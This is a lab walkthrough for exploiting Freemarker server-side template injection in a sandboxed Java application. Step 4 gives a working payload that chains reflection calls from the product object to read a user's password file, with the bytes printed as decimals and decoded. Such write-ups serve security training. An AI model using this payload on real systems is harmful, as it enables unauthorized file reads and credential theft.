# Exploiting Server-Side Template Injection in a Sandboxed Environment

This guide delivers a vibrant, creative, and well-structured walkthrough to exploit a **Server-Side Template Injection (SSTI)** vulnerability in a sandboxed environment using a Java-based template engine. Picture yourself as a code explorer, navigating a labyrinth of Java objects to unearth a hidden treasure—a secret password file! The objective is to inject a Freemarker template payload to access the `product` object, chain Java method calls to read `/home/carlos/my_password.txt`, convert the output to ASCII, and submit it to solve the lab.

## Objective
Inject a Freemarker template payload to execute a chain of Java method calls, read the contents of `carlos`’s password file, convert the decimal ASCII output to a string, and submit it to complete the lab.

## Prerequisites
- Burp Suite with Proxy configured (optional for monitoring requests).
- Access to the lab application with a user account and editable product description templates.
- Basic understanding of SSTI, Freemarker syntax, and Java object manipulation.
- Access to the [JavaDoc for the Object class](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/Object.html) for research.

## Background on the Vulnerability
The application uses the Freemarker template engine in a sandboxed environment, exposing the `product` object in product description templates. Although sandboxed, the template allows access to Java object methods, enabling attackers to chain calls from `product.getClass()` to access file-reading functionality. By navigating Java’s class hierarchy, attackers can read sensitive files like `/home/carlos/my_password.txt`, bypassing sandbox restrictions.

## Steps to Solve the Lab

### Step 1: Access the Product Template
1. Log in to the lab application and navigate to the product description template editor (e.g., via an admin or user panel).
2. **Observation**: The template has access to a `product` object, which can be manipulated using Freemarker’s `${expression}` syntax.

### Step 2: Test Object Method Access
1. Consult the [JavaDoc for the `Object` class](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/Object.html).
2. **Discovery**: All Java objects inherit `getClass()`, which returns the object’s class.
3. Edit a product description template and insert:
   ```
   ${product.getClass()}
   ```
4. Save the template and view the product page.
5. **Observation**: The output displays the class name (e.g., `com.example.Product`), confirming access to the `product` object’s methods.

![image](img/Server-side%20template%20injection%20in%20a%20sandboxed%20environment/Server-side%20template%20injection%20in%20a%20sandboxed%20environment(1).png)

### Step 3: Research Method Chaining for File Access
1. Explore the JavaDoc for related classes to build a chain from `getClass()` to file-reading methods:
   - `getClass()` → Returns `Class` object.
   - `Class.getProtectionDomain()` → Returns `ProtectionDomain`.
   - `ProtectionDomain.getCodeSource()` → Returns `CodeSource`.
   - `CodeSource.getLocation()` → Returns `URL`.
   - `URL.toURI()` → Converts to `URI`.
   - `URI.resolve(path)` → Resolves a file path (e.g., `/home/carlos/my_password.txt`).
   - `URI.toURL()` → Converts back to `URL`.
   - `URL.openStream()` → Opens an `InputStream`.
   - `InputStream.readAllBytes()` → Reads file contents as a byte array.
2. **Observation**: Freemarker’s `?join(" ")` can convert the byte array to a space-separated string of decimal ASCII values.

### Step 4: Craft the Payload
1. Construct the payload to read `/home/carlos/my_password.txt`:
   ```
   ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
   ```
   - Chains methods to access the file.
   - Outputs bytes as decimal ASCII code points (e.g., `97 98 99` for `abc`).
2. Edit the product description template and insert the payload.
3. Save the template.

![image](img/Server-side%20template%20injection%20in%20a%20sandboxed%20environment/Server-side%20template%20injection%20in%20a%20sandboxed%20environment(2).png)

### Step 5: View the Output
1. Navigate to the product page associated with the edited template.
2. **Observation**: The page displays a space-separated list of decimal numbers (e.g., `112 97 115 115 119 111 114 100`).

### Step 6: Convert Bytes to ASCII
1. Copy the output (e.g., `112 97 115 115 119 111 114 100`).
2. Convert each decimal number to its ASCII character:
   - 112 → `p`
   - 97 → `a`
   - 115 → `s`
   - 115 → `s`
   - 119 → `w`
   - 111 → `o`
   - 114 → `r`
   - 100 → `d`
   - Result: `password`
3. **Tip**: Use an online ASCII converter or Python script (e.g., `''.join(chr(int(x)) for x in "112 97 115 115 119 111 114 100".split())`) to automate conversion.

![image](img/Server-side%20template%20injection%20in%20a%20sandboxed%20environment/Server-side%20template%20injection%20in%20a%20sandboxed%20environment(3).png)
![image](img/Server-side%20template%20injection%20in%20a%20sandboxed%20environment/Server-side%20template%20injection%20in%20a%20sandboxed%20environment(4).png)

### Step 7: Submit the Password
1. Click the **Submit solution** button in the lab interface.
2. Enter the converted string (e.g., `password`).
3. Submit the solution.
4. **Observation**: The lab confirms the correct password, solving the lab.

### Step 8: Verify Success
1. If the lab does not confirm completion, verify:
   - The payload syntax is correct and matches the specified chain.
   - The output bytes are correctly converted to ASCII.
   - The submitted string matches the file’s contents exactly.
2. **Observation**: Successful submission of the password completes the lab.

![image](img/Server-side%20template%20injection%20in%20a%20sandboxed%20environment/Server-side%20template%20injection%20in%20a%20sandboxed%20environment(5).png)